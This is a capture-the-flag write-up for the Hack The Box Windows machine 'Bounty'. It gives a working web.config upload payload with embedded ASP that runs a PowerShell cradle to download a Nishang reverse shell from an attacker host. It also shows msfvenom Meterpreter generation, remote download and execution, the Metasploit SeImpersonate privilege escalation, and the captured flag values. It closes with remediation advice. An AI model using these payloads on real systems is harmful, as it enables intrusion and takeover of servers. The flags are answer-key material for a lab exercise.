# HTB - Bounty

**Difficulty:** Medium  
**OS:** Windows  
**Status:** Retired ✅

---

## Summary

Bounty is a Windows machine running IIS 7.5 with a file upload form that filters dangerous extensions. By uploading a malicious `web.config` file — which IIS executes as ASP code — we get remote code execution and a reverse shell as `merlin`. Privilege escalation to SYSTEM is achieved by exploiting `SeImpersonatePrivilege` using Metasploit's `ms16_075_reflection_juicy` module.

---

## Tools Used

- Nmap
- Gobuster
- Nishang (Invoke-PowerShellTcp.ps1)
- msfvenom
- Metasploit Framework (exploit/windows/local/ms16_075_reflection_juicy)
- Python HTTP Server
- Netcat

---

## Steps

### 1. Enumeration

```bash
nmap -sV -sC --min-rate 5000 10.129.27.196
```

**Open ports:**
- 80 → Microsoft IIS httpd 7.5

```bash
gobuster dir -u http://10.129.27.196 -w /usr/share/wordlists/dirb/common.txt -x asp,aspx
```

Found:
- `/transfer.aspx` → file upload form
- `/uploadedfiles/` → directory where uploaded files are stored

---

### 2. File Upload Bypass

The upload form blocks dangerous extensions like `.aspx` and `.php` but allows `.config`.

IIS 7.5 executes `.config` files as ASP code, so we can upload a malicious `web.config` with embedded ASP to get RCE.

---

### 3. web.config Payload

Created `shell.ps1` using Nishang:

```bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
echo "Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port 4444" >> shell.ps1
```

Created `web.config` with ASP code to download and execute the PowerShell reverse shell:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
   </appSettings>
</configuration>
<%
Set objShell = CreateObject("WScript.Shell")
strCommand = "cmd /c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shell.ps1')"
Set objShellExec = objShell.Exec(strCommand)
strOutput = objShellExec.StdOut.ReadAll()
WScript.StdOut.Write(strOutput)
WScript.Echo(strOutput)
%>
```

Uploaded `web.config` via `transfer.aspx`, then visited:

```
http://10.129.27.196/UploadedFiles/web.config
```

Got a reverse shell as `bounty\merlin`.

---

### 4. User Flag

```bash
gci -force C:\users\merlin\desktop
type C:\users\merlin\desktop\user.txt
```

Flag: `99f1829c1db551b1ec7666ebc44d22ea`

---

### 5. Privilege Escalation

Checked privileges:

```bash
whoami /priv
```

`SeImpersonatePrivilege` was **Enabled** — a classic path to SYSTEM.

Generated a Meterpreter payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=5555 -f exe -o scheduler.exe
```

Downloaded and executed it on the target:

```
(New-Object Net.WebClient).DownloadFile('http://<LHOST>/scheduler.exe','C:\Windows\Tasks\scheduler.exe')
cmd /c start C:\Windows\Tasks\scheduler.exe
```

Got a Meterpreter session, then used `ms16_075_reflection_juicy`:

```bash
use exploit/windows/local/ms16_075_reflection_juicy
set SESSION 1
set LHOST <LHOST>
set LPORT 6666
set payload windows/x64/meterpreter/reverse_tcp
run
```

Got a new Meterpreter session as `NT AUTHORITY\SYSTEM`.

---

### 6. Root Flag

```bash
shell
type C:\Users\Administrator\Desktop\root.txt
```

Flag: `a77c4d624bc32629fd3c949ca3ae700d`

---

## What I Learned

- IIS 7.5 executes `.config` files as ASP — a powerful file upload bypass technique
- `web.config` upload is a known attack vector when file extension filtering is not properly implemented
- `SeImpersonatePrivilege` enabled on a service account leads directly to SYSTEM via token impersonation exploits
- The `UploadedFiles` directory is cleared periodically — act fast after uploading

---

## Remediation

- Block `.config` uploads on the server side
- Implement file content validation, not just extension filtering
- Disable `SeImpersonatePrivilege` for non-essential service accounts
- Keep Windows systems patched — missing hotfixes leave the door open for kernel exploits
